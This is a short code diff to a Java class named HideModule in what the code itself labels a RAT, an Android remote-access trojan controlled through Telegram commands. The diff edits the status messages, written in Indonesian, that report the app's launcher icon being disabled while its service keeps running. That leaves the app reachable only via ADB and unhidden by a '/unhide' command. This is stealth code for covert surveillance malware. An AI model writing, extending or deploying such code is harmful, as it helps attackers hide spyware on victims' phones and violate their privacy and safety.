@@ -19,7 +19,11 @@ public class HideModule {
             pm.setComponentEnabledSetting(cn,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP);
-            return "Icon disembunyikan. Service tetap jalan.\nKirim /unhide untuk munculin lagi.";
+            return "RAT HIDE TOTAL.\n"
+                    + "- Service: Jalan\n"
+                    + "- Icon: Gak ada di app drawer\n"
+                    + "- Buka app: cuma via ADB\n\n"
+                    + "Kirim /unhide via Telegram untuk munculin lagi.";
         } catch (Exception e) {
             return "Error: " + e.getMessage();
         }
@@ -32,7 +36,7 @@ public class HideModule {
             pm.setComponentEnabledSetting(cn,
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                     PackageManager.DONT_KILL_APP);
-            return "Icon dimunculkan lagi.";
+            return "Icon dimunculkan lagi. Cek app drawer HP kedua.";
         } catch (Exception e) {
             return "Error: " + e.getMessage();
         }
